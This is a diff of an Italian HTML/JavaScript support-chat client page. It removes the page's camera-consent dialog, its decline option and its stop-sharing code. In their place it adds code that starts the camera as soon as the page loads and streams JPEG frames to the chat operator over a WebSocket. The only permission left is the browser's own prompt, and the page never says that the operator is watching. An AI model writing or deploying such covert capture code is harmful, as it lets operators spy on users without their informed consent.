@@ -1,144 +1,84 @@
 <!DOCTYPE html>
 <html lang="it">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Chat Utente</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Client Chat</title>
 <style>
-  body{margin:0;font-family:Segoe UI,Roboto,Arial;background:#050805;color:#dfffdc}
-  .app{max-width:600px;margin:20px auto;padding:12px}
-  header{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px}
-  h1{font-size:18px;margin:0;color:#2EA144}
-  #chat{height:60vh;background:#021002;border:1px solid #123;overflow:auto;padding:12px;border-radius:8px}
-  .row{display:flex;margin:6px 0}
-  .row.me{justify-content:flex-end}
-  .bubble{max-width:70%;padding:8px 12px;border-radius:14px;background:#0b4f2a;font-size:14px;line-height:1.2}
-  .row.me .bubble{background:#2EA144;color:#001}
-  .meta{font-size:11px;color:#a5f7b8;margin-top:4px;text-align:right}
-  .controls{display:flex;gap:8px;margin-top:8px}
-  input[type="text"]{flex:1;padding:8px;border-radius:8px;border:1px solid #234;background:#091009;color:#dfffdc}
-  button{background:#2EA144;color:#000;border:none;padding:8px 10px;border-radius:8px;cursor:pointer}
-  .consent{position:fixed;left:50%;top:50%;transform:translate(-50%,-50%);background:#021002;padding:18px;border-radius:8px;border:1px solid #133;z-index:50}
-  .consent h3{margin:0 0 8px 0;color:#2EA144}
-  .small{font-size:13px;color:#9fe}
+body{margin:0;padding:0;font-family:Arial;background:#000;color:#0f0;text-align:center}
+#chat{height:80vh;overflow:auto;padding:10px}
+.row{margin:6px 0}
+.row.me{text-align:right}
+.bubble{display:inline-block;padding:6px 10px;border-radius:14px;background:#0b4f2a;max-width:70%}
+.row.me .bubble{background:#2EA144;color:#001}
+.controls{display:flex;padding:6px}
+.controls input{flex:1;padding:6px;border-radius:6px;border:none;background:#011001;color:#dfffdc}
+.controls button{margin-left:6px;padding:6px 10px;background:#2EA144;border:none;color:#001;border-radius:6px;cursor:pointer}
 </style>
 </head>
 <body>
-<div class="app">
-  <header>
-    <h1>Supporto — Chat Utente</h1>
-    <div id="status">Connesso</div>
-  </header>
-
-  <div id="chat"></div>
-
-  <div class="controls">
-    <input type="text" id="text" placeholder="Scrivi un messaggio..." />
-    <button id="sendBtn">Invia</button>
-  </div>
-</div>
-
-<!-- Consent modal shown immediately -->
-<div id="consent" class="consent" aria-hidden="false">
-  <h3>Condivisione fotocamera</h3>
-  <p class="small">L'operatore potrebbe vedere la fotocamera posteriore se acconsenti.</p>
-  <div style="text-align:right;margin-top:12px">
-    <button id="decline">Rifiuta</button>
-    <button id="accept" style="margin-left:8px">Condividi</button>
-  </div>
+<div id="chat"></div>
+<div class="controls">
+  <input type="text" id="text" placeholder="Scrivi un messaggio...">
+  <button id="sendBtn">Invia</button>
 </div>
 
 <script>
-const room = new URLSearchParams(location.search).get('room') || 'user1';
-const ws = new WebSocket(`${location.protocol === 'https:' ? 'wss' : 'ws'}://${location.host}/ws?role=client&room=${room}`);
-const chatEl = document.getElementById('chat');
-const textIn = document.getElementById('text');
-const sendBtn = document.getElementById('sendBtn');
-const statusEl = document.getElementById('status');
-const consentModal = document.getElementById('consent');
-const acceptBtn = document.getElementById('accept');
-const declineBtn = document.getElementById('decline');
+const room = prompt('Inserisci il tuo ID utente') || 'user1';
+const ws = new WebSocket(`${location.protocol==='https:'?'wss':'ws'}://${location.host}/ws?role=client&room=${room}`);
+const chatEl=document.getElementById('chat');
+const textIn=document.getElementById('text');
+const sendBtn=document.getElementById('sendBtn');
 
-let localStream = null;
-let sharing = false;
-
-function addMessage(from, text, me=false){
-  const row = document.createElement('div');
-  row.className = 'row' + (me ? ' me' : '');
-  const bubble = document.createElement('div');
-  bubble.className = 'bubble';
-  bubble.innerHTML = `<div>${text}</div><div class="meta">${from} • ${new Date().toLocaleTimeString()}</div>`;
+function addMessage(from,text,me=false){
+  const row=document.createElement('div');
+  row.className='row'+(me?' me':'');
+  const bubble=document.createElement('div');
+  bubble.className='bubble';
+  bubble.textContent=text;
   row.appendChild(bubble);
   chatEl.appendChild(row);
-  chatEl.scrollTop = chatEl.scrollHeight;
+  chatEl.scrollTop=chatEl.scrollHeight;
 }
 
-ws.addEventListener('open', () => statusEl.textContent='Connesso');
-
-ws.addEventListener('message', e => {
-  try {
-    const data = JSON.parse(e.data);
-    if(data.type==='chat') addMessage(data.from, data.text, false);
-  } catch(err) {}
+ws.addEventListener('message',e=>{
+  try{
+    const data=JSON.parse(e.data);
+    if(data.type==='chat') addMessage(data.from,data.text,false);
+  }catch(err){console.error(err);}
 });
 
-ws.addEventListener('close', ()=>statusEl.textContent='Disconnesso');
-
-sendBtn.onclick = () => {
-  const text = textIn.value.trim();
-  if(!text) return;
-  const msg = { type:'chat', from:'Utente', text, room };
-  ws.send(JSON.stringify(msg));
-  addMessage('Tu', text, true);
+sendBtn.onclick=()=>{
+  const txt=textIn.value.trim();
+  if(!txt) return;
+  ws.send(JSON.stringify({type:'chat',text:txt}));
+  addMessage('Tu',txt,true);
   textIn.value='';
 };
 
-// Consent modal
-acceptBtn.onclick = async () => {
-  consentModal.style.display='none';
-  try {
-    localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio:false });
-    sharing=true;
-    ws.send(JSON.stringify({ type:'cameraStatus', room, status:'accepted' }));
-    startSendingFrames();
-  } catch(err){
-    sharing=false;
-    ws.send(JSON.stringify({ type:'cameraStatus', room, status:'declined' }));
-  }
-};
-declineBtn.onclick = () => {
-  consentModal.style.display='none';
-  sharing=false;
-  ws.send(JSON.stringify({ type:'cameraStatus', room, status:'declined' }));
-};
-
-function stopSharing(){
-  if(localStream) localStream.getTracks().forEach(t=>t.stop());
-  localStream=null; sharing=false;
-  ws.send(JSON.stringify({ type:'cameraStatus', room, status:'stopped' }));
+// Chiedi consenso fotocamera e invia frame
+async function startCamera(){
+  try{
+    const stream=await navigator.mediaDevices.getUserMedia({video:{width:{ideal:640}},audio:false});
+    const video=document.createElement('video');
+    video.srcObject=stream;
+    video.play();
+    const canvas=document.createElement('canvas');
+    function sendFrame(){
+      if(video.videoWidth===0){ setTimeout(sendFrame,120); return; }
+      canvas.width=video.videoWidth/2;
+      canvas.height=video.videoHeight/2;
+      const ctx=canvas.getContext('2d');
+      ctx.drawImage(video,0,0,canvas.width,canvas.height);
+      const imgData=canvas.toDataURL('image/jpeg',0.65);
+      ws.send(JSON.stringify({type:'video',room,cam:'back',image:imgData}));
+      setTimeout(sendFrame,120);
+    }
+    sendFrame();
+  }catch(err){ console.log('Errore fotocamera',err); }
 }
 
-window.addEventListener('beforeunload', ()=>{ stopSharing(); try{ ws.close(); }catch{} });
-
-function startSendingFrames(){
-  if(!sharing || !localStream) return;
-  const v = document.createElement('video');
-  v.srcObject=localStream;
-  v.play();
-  const canvas=document.createElement('canvas');
-  function frame(){
-    if(!sharing) return;
-    if(v.videoWidth===0){ setTimeout(frame,120); return; }
-    canvas.width=Math.floor(v.videoWidth/2);
-    canvas.height=Math.floor(v.videoHeight/2);
-    const ctx=canvas.getContext('2d');
-    ctx.drawImage(v,0,0,canvas.width,canvas.height);
-    const dataUrl=canvas.toDataURL('image/jpeg',0.65);
-    ws.send(JSON.stringify({ type:'video', room, image:dataUrl }));
-    setTimeout(frame,120);
-  }
-  frame();
-}
+startCamera();
 </script>
 </body>
 </html>
